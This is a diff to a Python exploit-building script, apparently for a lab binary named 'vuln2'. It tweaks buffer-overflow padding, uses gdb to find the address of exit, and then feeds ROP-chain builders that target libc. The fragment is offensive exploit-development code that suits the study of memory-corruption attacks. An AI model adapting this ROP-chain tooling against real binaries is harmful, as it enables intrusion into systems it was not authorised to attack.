@@ -895,6 +895,15 @@ def find_buffer_addr(vuln_binary, payload_length, use_gdb):
         os.remove("./find_buf.gdb")
     else:
         cmd = "./vuln2 " + "A"*payload_length + "|grep \"Address of buf\"|awk '{print $5}'"
+        if payload_length > 424:
+            rem = (payload_length - 424)/4
+            with io.FileIO("find_exit.gdb", "w") as file:
+                file.write("b main\nrun hello\np/x &exit\n")
+            gdb_cmd = "gdb --batch --command=./find_exit.gdb --args ./vuln2 hello|tail -1|awk '{print $3}'"
+            gproc = subprocess.Popen(gdb_cmd, shell=True, stdout=subprocess.PIPE)
+            gproc.wait()
+            exit_addr = int(gproc.stdout.read(), 16)
+            cmd = "./vuln2 " + "A"*424 +  rem * pack_value(exit_addr) + "|grep \"Address of buf\"|awk '{print $5}'"
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
         proc.wait()
         try:
@@ -976,7 +985,7 @@ if __name__ == '__main__':
         rop_payload = build_rop_chain_libc(lib_list, buffer_address)
 
     elif (len(libraries) == 1) and (libraries[0].count("libc") == 1):
-        buffer_address = find_buffer_addr(vuln_bin, 440, if_use_gdb)
+        buffer_address = find_buffer_addr(vuln_bin, 444, if_use_gdb)
         rop_payload = build_rop_chain_libc_syscalls(lib_list, buffer_address)
 
     else:
